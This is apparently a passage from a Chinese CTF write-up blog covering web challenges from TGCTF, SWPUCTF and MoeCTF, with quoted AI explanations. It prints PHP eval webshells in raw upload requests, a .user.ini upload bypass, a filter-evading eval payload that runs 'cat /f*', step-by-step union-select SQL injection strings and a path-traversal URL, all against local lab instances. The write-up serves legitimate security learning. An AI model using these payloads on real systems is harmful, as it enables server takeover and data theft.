class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">上传文件</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 08 May 2025 09:24:17 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.26<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">200</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>4e0a<span class="hljs-char escape_">\u</span>4f20<span class="hljs-char escape_">\u</span>6210<span class="hljs-char escape_">\u</span>529f<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure>
<p>解码后的意思就是成功<br>文件上传成功！<br>访问<br>&#x2F;uploads&#x2F;shell.jpg<br>访问成功！  </p>
<p>然后接下来传.user.ini</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = shell.jpg<br></code></pre></td></tr></table></figure>
<p>上传成功<br>接下来用蚂蚁连<br>&#x2F;uploads&#x2F;index.php<br>失败？  </p>
<p>不对，竟然不用  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;包裹，那应该也不用&lt;script&gt;头了<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure>
<p>也不行，<br>实在没办法了，去看wp，<br>说是在源码里知道能用name参数来进行目录穿越？  </p>
<p>直接传  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php?name=shell.php/.</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50404<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryDxKYmUwl8LfJkYfi<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;name&quot;</span>; filename=<span class="hljs-string">&quot;hello.jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传文件</span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>

<p>尽然就成功传进去了？<br>这个是什么构造法？什么原理？<br>&#x2F;upload.php?name&#x3D;hello.php&#x2F;.   </p>
<p>然后蚂蚁直接连<br>&#x2F;uploads&#x2F;shell.php<br>然后用蚂蚁的终端看环境<br>env<br>看到flag</p>
<p>原理是啥，怎么绕过的？</p>
<p>deepseek:  </p>
<blockquote>
<p>漏洞点：当攻击者通过GET参数name&#x3D;shell.php&#x2F;.传递文件名时，pathinfo()解析扩展名的行为异常。<br>pathinfo(‘shell.php&#x2F;.’, PATHINFO_EXTENSION)会返回空值，因为末尾的&#x2F;.被识别为目录结构而非文件扩展名。<br>黑名单检查$deny_ext因此误判文件类型合法，绕过防护。  </p>
</blockquote>
<p>反正我在kali里<br>echo 114514 &gt; sunxiaochuan258.txt&#x2F;.是无法执行的  </p>
<p>那可能就是误判文件类型了</p>
<p>当然，刚才是烧一点的做法，正常的做法是<br>利用name参数来进行目录穿越，然后在index.php主目录下上传shell.jpg和.user.ini</p>
<p>这题也是学到不少</p>
<h1 id="TGCTF-AAA偷渡阴平"><a href="#TGCTF-AAA偷渡阴平" class="headerlink" title="TGCTF AAA偷渡阴平"></a>TGCTF AAA偷渡阴平</h1><p>据说是web签到<br>开题拿到源码  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>

<p>?tgctf2025&#x3D;system(ls);<br>&#x2F;&#x2F;Warning: Use of undefined constant ls - assumed ‘ls’ (this will throw an Error in a future version of PHP) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(8) : eval()’d code on line 1<br>index.php</p>
<p>看wp得到payload<br>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(‘cat &#x2F;f*’);<br>不明白<br>问问ai  </p>
<h2 id="kimi"><a href="#kimi" class="headerlink" title="kimi:  "></a>kimi:  </h2><p>该 PHP 脚本存在代码注入漏洞，以下是对 payload 的解释：  </p>
<p>?tgctf2025&#x3D;eval(end(current(get_defined_vars()))); ：  </p>
<p>get_defined_vars() 返回一个包含所有已定义变量的数组，包括全局变量和局部变量。  </p>
<p>current() 函数取得数组中的当前元素，这里会得到数组的第一个元素，通常是 GLOBALS 数组。  </p>
<p>end() 函数将数组的内部指针指向最后一条记录并返回该记录，此处作用于 current(get_defined_vars()) 的返回值，即 GLOBALS 数组，所以会指向 GLOBALS 数组的最后一个元素。    </p>
<p>但在这段代码中，由于 get_defined_vars() 返回的是所有变量数组，而我们是先用 current() 取第一个元素（即 GLOBALS 数组），再用 end() 将其指针移到最后一个元素，但这对于绕过正则过滤和执行命令来说，并非关键，真正关键的是后续如何利用 b 参数来实现命令执行。    </p>
<p>eval() 函数会对传入的字符串作为 PHP 代码进行解析和执行，将 end(current(get_defined_vars())) 的结果传递给 eval，但此处关键不在于这个 eval 的内容，而在于后面的参数是如何被利用的。  </p>
<p>&amp;b&#x3D;system(‘cat &#x2F;f*’); ：  </p>
<p>这里通过 GET 请求传递了一个 b 参数，其值为 system(‘cat &#x2F;f*’);。  </p>
<p>在 PHP 中，system() 函数用于执行外部程序，并且会输出结果。  </p>
<p>‘cat &#x2F;f*’ 是一个 Linux 系统命令，cat 用于输出文件内容，&#x2F;f* 是匹配以 &#x2F;f 开头的所有文件，通常在一些 CTF（Capture The Flag）题目中，可能存在 &#x2F;flag.txt 或类似路径的文件存放着标志（flag），所以这个命令意图读取这样的文件内容。  </p>
<p>结合整个 payload 来看，由于脚本中未对 tgctf2025 参数的有效字符进行严格限制，正则表达式存在漏洞，攻击者可以构造特殊的 PHP 代码并通过 eval 执行，从而实现命令执行等恶意操作，这里的 payload 利用了 get_defined_vars() 来获取变量并结合 b 参数中的 system 函数调用，试图读取服务器上的敏感文件内容，但实际能否成功还取决于服务器环境等其他因素，例如是否允许 system 函数执行等。  </p>
<p>deepseek:<br>步骤 1：获取所有变量<br>get_defined_vars() 返回当前作用域内的所有变量，包括超全局数组 $_GET。此时，$_GET 包含：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span> = [<br>    <span class="hljs-string">&#x27;tgctf2025&#x27;</span> =&gt; <span class="hljs-string">&#x27;eval(end(current(get_defined_vars())));&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span><br>];<br></code></pre></td></tr></table></figure>
<p>步骤 2：提取 $_GET 数组<br>current(get_defined_vars())：current() 返回数组的第一个元素。由于 $_GET 是超全局变量，它在返回的数组中通常位于前列，因此这里获取到 $_GET 数组。  </p>
<p>end(current(…))：将 $_GET 的内部指针移动到末尾（即参数 b），并返回其值 system(‘cat &#x2F;f*’);。  </p>
<p>步骤 3：执行命令</p>
<p>eval(end(current(get_defined_vars()))) 最终执行 system(‘cat &#x2F;f*’);，读取服务器上的 &#x2F;f* 文件（如 &#x2F;flag）。  </p>
<p>&#x2F;&#x2F; </p>
<p>我的理解就是：    </p>
<p>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(‘cat &#x2F;f*’);<br>先新建一个eval函数<br>然后get_defined_vars()用来返回所有定义的变量，包含全局的非全局的,这两类会被分为两个数组，<br>在用current()选择get_defined_vars()生成的数组中的第一个，因为$_GET为超全局变量，所以会在返回的第一个，而此时get中有两个变量，’tgctf2025’ 和 ‘b’<br>再用end来选取全局变量组成的数组中的最后一个元素，即为b</p>
<p>然后用最外第二层的eval函数来执行变量$b,<br>而源码中的第一层eval 就是用来执行这两段操作的，相当于我们上传了两段代码  </p>
<h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p>按f12 看到标题提示参数是wllm<br>传一个wllm&#x3D;1看看，这熟悉的绿字，感觉回到了sql-labs<br>再传个2，不回显<br>那简单fuzz一下  </p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs excel">过滤了：<br>空格 <br>+<br>=<br><span class="hljs-built_in">and</span><br>updatexml<br>extr<br>extractvalue<br><br><span class="hljs-number">0</span>&#x27;<span class="hljs-built_in">or</span>%<span class="hljs-number">0</span>aunion%<span class="hljs-number">0</span>aselect%<span class="hljs-number">0</span>a1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
<p>好嘛，试了好久原来是#它不自己进行url编码  </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span>order<span class="hljs-variable">%0</span>aby<span class="hljs-variable">%0</span>a<span class="hljs-number">3</span><span class="hljs-variable">%23</span><br>测出回显列为<span class="hljs-number">3</span>  <br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>database()<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>/?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-variable">%23</span><br>Your Password:ALL_PLUGINS<span class="hljs-punctuation">,</span>APPLICAB<br>//不是，我用第二行回显甚至会报错？什么题目环境<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)where(table_schema)like(database())<span class="hljs-variable">%23</span><br>Your Password:LTLT_flag<span class="hljs-punctuation">,</span>users<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from(information_schema.columns)where(table_name)like(&#x27;LTLT_flag&#x27;)<span class="hljs-variable">%23</span><br>Your Password:id<span class="hljs-punctuation">,</span>flag<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)from(LTLT_flag)<span class="hljs-variable">%23</span><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<br>只得到一半<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(group_concat(flag)from(LTLT_flag))<span class="hljs-variable">%23</span><br>试了一下  <br>reverse，<br>left<br>都不能用<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span><span class="hljs-number">40</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>mid函数试了好久，看wp才知道正确用法😫<br>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>e<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">40</span><span class="hljs-punctuation">,</span><span class="hljs-number">60</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>ca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>eca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure>
<p>总结，不能小看啊，太久不做容易在小地方犯错，比如url编码，mid函数使用,幸好大方向是对的，给一个安心看别人wp得理由啊啊🤣</p>
<h1 id="MoeCTF-垫刀之路01-MoeCTF？启动！"><a href="#MoeCTF-垫刀之路01-MoeCTF？启动！" class="headerlink" title="MoeCTF 垫刀之路01: MoeCTF？启动！"></a>MoeCTF 垫刀之路01: MoeCTF？启动！</h1><p>ls &#x2F; 查看根目录  </p>
<p>cat &#x2F;flag<br>提示flag不在这，去看系统环境  </p>
<p>env<br>拿到flag</p>
<h1 id="MoeCTF-垫刀之路02-普通的文件上传"><a href="#MoeCTF-垫刀之路02-普通的文件上传" class="headerlink" title="MoeCTF 垫刀之路02: 普通的文件上传"></a>MoeCTF 垫刀之路02: 普通的文件上传</h1><p>直接传php马  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure>

<p>然后用蚂蚁连或者直接post一个env就能看到flag</p>
<h1 id="MoeCTF-垫刀之路03-这是一个图床"><a href="#MoeCTF-垫刀之路03-这是一个图床" class="headerlink" title="MoeCTF 垫刀之路03: 这是一个图床"></a>MoeCTF 垫刀之路03: 这是一个图床</h1><p>只在前端做了限制，改前端代码或者bp抓包传就行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:13280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>209<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryJHC9baVxiUBdxw4G<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;image&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);</span><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>
<p>传完后蚂蚁直接连<br>同样查看环境拿到flag  </p>
<h1 id="MoeCTF-垫刀之路04-一个文件浏览器"><a href="#MoeCTF-垫刀之路04-一个文件浏览器" class="headerlink" title="MoeCTF 垫刀之路04: 一个文件浏览器"></a>MoeCTF 垫刀之路04: 一个文件浏览器</h1><p>java站点，直接在url就能目录穿越，然后就是手工找flag。。。<br>flag目录：<br>?path&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;tmp&#x2F;flag  </p>
<h1 id="MoeCTF-ProveYourLove"><a href="#MoeCTF-ProveYourLove" class="headerlink" title="MoeCTF ProveYourLove"></a>MoeCTF ProveYourLove</h1><p>根据题目提示传够 300次就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;nickname&quot;</span>:<span class="hljs-string">&quot;mignon&quot;</span>,<span class="hljs-string">&quot;user_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;target&quot;</span>:<span class="hljs-string">&quot;nm&quot;</span>,<span class="hljs-string">&quot;target_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;anonymous&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>&#125;<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:42701/questionnaire&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    qq = requests.post(url,json=data)<br>    <span class="hljs-built_in">print</span>(qq.text)<br></code></pre></td></tr></table></figure>

<h1 id="Moe-CTF-静态网页"><a href="#Moe-CTF-静态网页" class="headerlink" title="Moe CTF 静态网页"></a>Moe CTF 静态网页</h1><p>点击看板娘，会在bp看到发包并且有个传参，在浏览器访问并且改id&#x3D;1<br>在最下面看到final1l1l_challenge.php<br>直接访问<br>得到  </p>
